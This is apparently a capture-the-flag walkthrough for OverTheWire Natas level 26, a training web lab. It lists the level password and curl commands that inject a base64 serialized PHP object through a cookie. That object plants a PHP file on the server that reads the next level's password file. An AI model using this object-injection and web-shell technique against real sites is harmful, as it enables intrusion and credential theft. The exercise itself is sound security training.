# How to get access

If the password has changed, then we might be able to find it on learnit.


1. Go to the URL: [http://natas26.natas.labs.overthewire.org](http://natas26.natas.labs.overthewire.org)
2. Login with the username: "natas26" and password: "cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE"
3. make a drawing so we get a cookie
4. Run the test.php to get the base64 encoded code
5. Change the cookie to the new value
6. Refresh the page and you will get an error message
7. Go to the URL: [http://natas26.natas.labs.overthewire.org/img/myLogKali.php](http://natas26.natas.labs.overthewire.org/img/myLogKali.php)

## With terminal

### Make the base64 encoded php code

```bash
php test.php

# or use https://www.programiz.com/php/online-compiler/
```

### Use curl to inject the cookie

```bash
curl -s --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE --cookie "drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbXlMb2dLYWxpLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjE0OiJTdGFydCBsb2dnaW5nCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUyOiI8cGhwIHBhc3N0aHJ1KCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4KIjt9" http://natas26.natas.labs.overthewire.org
```

### Get the natas27 password

```bash
curl -s --user natas26:cVXXwxMS3Y26n5UZU89QgpGmWCelaQlE http://natas26.natas.labs.overthewire.org/img/myLogKali.php
```

